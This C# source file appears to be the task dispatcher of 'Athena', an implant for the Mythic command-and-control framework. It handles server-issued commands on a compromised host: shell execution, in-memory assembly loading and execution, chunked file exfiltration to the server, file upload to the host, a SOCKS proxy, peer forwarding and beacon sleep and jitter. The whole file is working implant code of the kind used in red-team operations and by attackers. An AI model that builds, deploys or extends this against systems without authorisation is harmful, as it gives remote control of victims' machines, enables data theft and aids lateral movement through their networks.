﻿using Athena.Models.Athena.Commands;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using System.Text;
using PluginBase;
using Newtonsoft.Json;

namespace Athena.Commands
{
    public class CommandHandler
    {
        public delegate void SetSleepAndJitterHandler(object sender, TaskEventArgs e);
        public event EventHandler<TaskEventArgs> SetSleepAndJitter;
        public delegate void StartForwarderHandler(object sender, TaskEventArgs e);
        public event EventHandler<TaskEventArgs> StartForwarder;
        public delegate void StopForwarderHandler(object sender, TaskEventArgs e);
        public event EventHandler<TaskEventArgs> StopForwarder;
        public delegate void StartSocksHandler(object sender, TaskEventArgs e);
        public event EventHandler<TaskEventArgs> StartSocks;
        public delegate void StopSocksHandler(object sender, TaskEventArgs e);
        public event EventHandler<TaskEventArgs> StopSocks;
        public delegate void ExitRequestedHandler(object sender, TaskEventArgs e);
        public event EventHandler<TaskEventArgs> ExitRequested;

        private ConcurrentDictionary<string, MythicJob> activeJobs { get; set; }
        private AssemblyHandler assemblyHandler { get; set; }
        private DownloadHandler downloadHandler { get; set; }
        private ShellHandler shellHandler { get; set; }
        private UploadHandler uploadHandler { get; set; }
        private ConcurrentBag<object> responseResults { get; set; }
        public CommandHandler()
        {
            this.activeJobs = new ConcurrentDictionary<string, MythicJob>();
            this.assemblyHandler = new AssemblyHandler();
            this.downloadHandler = new DownloadHandler();
            this.shellHandler = new ShellHandler();
            this.uploadHandler = new UploadHandler();
            this.responseResults = new ConcurrentBag<object>();
        }
        /// <summary>
        /// Initiate a task provided by the Mythic server
        /// </summary>
        /// <param name="task">MythicTask object containing the parameters of the task</param>
        public async Task StartJob(MythicTask task)
        {
            MythicJob job = activeJobs.GetOrAdd(task.id, new MythicJob(task));
            job.started = true;

            switch (job.task.command)
            {
                case "download": //Can likely be dynamically loaded
                    if (!await downloadHandler.ContainsJob(job.task.id))
                    {
                        this.responseResults.Add(await downloadHandler.StartDownloadJob(job));
                    }
                    break;
                case "execute-assembly": //Should be able to stop it
                    this.responseResults.Add(await assemblyHandler.ExecuteAssembly(job));
                    break;
                case "exit":
                    RequestExit(job);
                    break;
                case "jobs": //Can likely be dynamically loaded
                    this.responseResults.Add(await this.GetJobs(task.id));
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "jobkill": //Maybe can be loaded? //Also add a kill command for processes
                    if (this.activeJobs.ContainsKey(task.parameters))
                    {
                        this.activeJobs[task.parameters].cancellationtokensource.Cancel();
                        this.responseResults.Add(new ResponseResult
                        {
                            user_output = "Cancelled job",
                            completed = "true",
                            task_id = job.task.id,
                        });
                    }
                    else
                    {
                        this.responseResults.Add(new ResponseResult
                        {
                            user_output = "Job doesn't exist",
                            completed = "true",
                            task_id = job.task.id,
                            status = "error"
                        });
                    }
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "link":
                    StartInternalForwarder(job);
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "load":
                    this.responseResults.Add(await assemblyHandler.LoadCommandAsync(job));
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "load-assembly":
                    this.responseResults.Add(await assemblyHandler.LoadAssemblyAsync(job));
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "reset-assembly-context":
                    this.responseResults.Add(await assemblyHandler.ClearAssemblyLoadContext(job));
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "shell": //Can be dynamically loaded
                    this.responseResults.Add(await this.shellHandler.ShellExec(job));
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "sleep":
                    UpdateSleepAndJitter(job);
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "socks": //Maybe can be dynamically loaded? Might be better to keep it built-in
                    var socksInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
                    if((string)socksInfo["action"] == "start")
                    {
                        StartSocksProxy(job);
                    }
                    else
                    {
                        StopSocksProxy(job);
                    }
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "stop-assembly":
                    this.responseResults.Add(new ResponseResult
                    {
                        user_output = "Not implemented yet.",
                        completed = "true",
                        task_id = job.task.id,
                    });
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "unlink":
                    StopInternalForwarder(job);
                    this.activeJobs.Remove(task.id, out _);
                    break;
                case "upload": //Can likely be dynamically loaded
                    if(!await downloadHandler.ContainsJob(job.task.id))
                    {
                        this.responseResults.Add(await uploadHandler.StartUploadJob(job));
                    }
                    break;
                default:
                    this.responseResults.Add(await CheckAndRunPlugin(job));
                    break;
            }
        }
        /// <summary>
        /// EventHandler to begin exit
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void RequestExit(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            ExitRequested(this, exitArgs);
        }
        /// <summary>
        /// EventHandler to start socks proxy
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void StartSocksProxy(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            StartSocks(this, exitArgs);
        }
        /// <summary>
        /// EventHandler to stop socks proxy
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void StopSocksProxy(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            StopSocks(this, exitArgs);
        }
        /// <summary>
        /// EventHandler to start internal forwarder
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void StartInternalForwarder(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            StartForwarder(this, exitArgs);
        }
        /// <summary>
        /// EventHandler to stop internal forwarder
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void StopInternalForwarder(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            StopForwarder(this, exitArgs);
        }
        /// <summary>
        /// EventHandler to update sleep and jitter
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void UpdateSleepAndJitter(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            SetSleepAndJitter(this, exitArgs);
        }
        /// <summary>
        /// Cancel a currently executing job
        /// </summary>
        /// <param name="task">MythicTask containing the task id to cancel</param>
        public async Task StopJob(MythicTask task)
        {
            //todo
        }
        /// <summary>
        /// Provide a list of repsonses to the MythicClient
        /// </summary>
        public async Task<List<object>> GetResponses()
        {
            List<object> responses = this.responseResults.ToList<object>();
            if (this.assemblyHandler.assemblyIsRunning)
            {
                responses.Add(await this.assemblyHandler.GetAssemblyOutput());
            }

            if (await this.shellHandler.HasRunningJobs())
            {
                responses.AddRange(await this.shellHandler.GetOutput());
            }

            this.responseResults.Clear();
            return responses;
        }
        /// <summary>
        /// Add a ResponseResult to the response list
        /// </summary>
        /// <param name="response">ResposneResult or inherited object containing the task results</param>
        public async Task AddResponse(object response)
        {
            this.responseResults.Add(response);
        }
        /// <summary>
        /// Add multiple ResponseResult to the response list
        /// </summary>
        /// <param name="response">ResposneResult or inherited object containing the task results</param>
        public async Task AddResponse(List<object> responses)
        {
            foreach(object response in responses)
            {
                this.responseResults.Prepend<object>(response); //Add to the beginning in case another task result returns
            }
        }
        /// <summary>
        /// Get the currently running jobs
        /// </summary>
        /// <param name="task_id">Task ID of the mythic job to respond to</param>
        private async Task<ResponseResult> GetJobs(string task_id)
        {
            StringBuilder sb = new StringBuilder();
            foreach (var j in this.activeJobs)
            {
                sb.AppendLine($"{{\"id\":\"{j.Value.task.id}\",");
                sb.AppendLine($"\"command\":\"{j.Value.task.command}\",");
                if (j.Value.started & !j.Value.complete)
                {
                    sb.AppendLine($"\"status\":\"Started\"}},");
                }
                else
                {
                    sb.AppendLine($"\"status\":\"Queued\"}},");
                }
            }

            return new ResponseResult()
            {
                user_output = sb.ToString(),
                task_id = task_id,
                completed = "true"
            };
        }     
        /// <summary>
        /// Check if a plugin is already loaded and execute it
        /// </summary>
        /// <param name="job">MythicJob containing execution parameters</param>
        private async Task<object> CheckAndRunPlugin(MythicJob job)
        {
            if (await this.assemblyHandler.CommandIsLoaded(job.task.command))
            {
                return await this.assemblyHandler.RunLoadedCommand(job);
            }
            else
            {
                return new ResponseResult()
                {
                    completed = "true",
                    user_output = "Plugin not loaded. Please use the load command to load the plugin!",
                    task_id = job.task.id,
                    status = "error",
                };
            }
        }
        /// <summary>
        /// Begin the next process of the upload task
        /// </summary>
        /// <param name="response">The MythicResponseResult object provided from the Mythic server</param>
        public async Task HandleUploadPiece(MythicResponseResult response)
        {
            MythicUploadJob uploadJob = await this.uploadHandler.GetUploadJob(response.task_id);
            if (uploadJob.cancellationtokensource.IsCancellationRequested)
            {
                this.activeJobs.Remove(response.task_id, out _);
                await this.uploadHandler.CompleteUploadJob(response.task_id);
            }

            if(uploadJob.total_chunks == 0)
            {
                uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
            }
            if (!String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
            {
                await this.uploadHandler.UploadNextChunk(await Misc.Base64DecodeToByteArrayAsync(response.chunk_data), response.task_id);
                uploadJob.chunk_num++;
                if (response.chunk_num == uploadJob.total_chunks)
                {
                    await this.uploadHandler.CompleteUploadJob(response.task_id);
                    this.activeJobs.Remove(response.task_id, out _);
                    this.responseResults.Add(new UploadResponse
                    {
                        task_id=response.task_id,
                        completed = "true",
                        upload = new UploadResponseData
                        {
                            chunk_num = uploadJob.chunk_num,
                            file_id = response.file_id,
                            chunk_size = uploadJob.chunk_size,
                            full_path = uploadJob.path
                        }
                    });
                }
                else
                {
                    this.responseResults.Add(new UploadResponse
                    {
                        task_id = response.task_id,
                        upload = new UploadResponseData
                        {
                            chunk_num = uploadJob.chunk_num,
                            file_id = response.file_id,
                            chunk_size = uploadJob.chunk_size,
                            full_path = uploadJob.path
                        }
                    });
                }

            }
            else
            {
                this.responseResults.Add(new ResponseResult
                {
                    status = "error",
                    completed = "true",
                    task_id = response.task_id,
                    user_output = "Mythic sent no data to upload!"

                });
            }
        }
        /// <summary>
        /// Begin the next process of the download task
        /// </summary>
        /// <param name="response">The MythicResponseResult object provided from the Mythic server</param>
        public async Task HandleDownloadPiece(MythicResponseResult response)
        {
            MythicDownloadJob downloadJob = await this.downloadHandler.GetDownloadJob(response.task_id);
            if (downloadJob.cancellationtokensource.IsCancellationRequested)
            {
                this.activeJobs.Remove(response.task_id, out _);
                await this.uploadHandler.CompleteUploadJob(response.task_id);
            }

            if (string.IsNullOrEmpty(downloadJob.file_id) && string.IsNullOrEmpty(response.file_id))
            {
                await this.downloadHandler.CompleteDownloadJob(response.task_id);
                this.activeJobs.Remove(response.task_id, out _);
                this.responseResults.Add(new DownloadResponse
                {
                    task_id = response.task_id,
                    status = "error",
                    user_output = "No file_id received from Mythic",
                    completed = "true"
                });
            }
            else
            {
                if (String.IsNullOrEmpty(downloadJob.file_id))
                {
                    downloadJob.file_id = response.file_id;
                }

                if (response.status == "success")
                {
                    if (downloadJob.chunk_num != downloadJob.total_chunks)
                    {
                        downloadJob.chunk_num++;

                        this.responseResults.Add(new DownloadResponse
                        {
                            task_id = response.task_id,
                            user_output = String.Empty,
                            status = String.Empty,
                            full_path = String.Empty,
                            total_chunks = -1,
                            file_id = downloadJob.file_id,
                            chunk_num = downloadJob.chunk_num,
                            chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob)
                        });
                    }
                    else
                    {
                        await this.downloadHandler.CompleteDownloadJob(response.task_id);
                        this.activeJobs.Remove(response.task_id, out _);
                        this.responseResults.Add(new DownloadResponse
                        {
                            task_id = response.task_id,
                            user_output = String.Empty,
                            status = String.Empty,
                            full_path = String.Empty,
                            chunk_num = downloadJob.chunk_num,
                            chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob),
                            file_id = downloadJob.file_id,
                            completed = "true",
                            total_chunks = -1
                            
                        });
                    }
                }
                else
                {
                    this.responseResults.Add(new DownloadResponse
                    {
                        task_id = response.task_id,
                        file_id = downloadJob.file_id,
                        chunk_num = downloadJob.chunk_num,
                        chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob)
                    });
                }
            }
        }
        /// <summary>
        /// Check if an upload job exists
        /// </summary>
        /// <param name="task_id">Task ID of the mythic job to respond to</param>
        public async Task<bool> HasUploadJob(string task_id)
        {
            return await this.uploadHandler.ContainsJob(task_id);
        }
        /// <summary>
        /// Check if a download job exists
        /// </summary>
        /// <param name="task_id">Task ID of the mythic job to respond to</param>
        public async Task<bool> HasDownloadJob(string task_id)
        {
            return await this.downloadHandler.ContainsJob(task_id);
        }   
    }
}
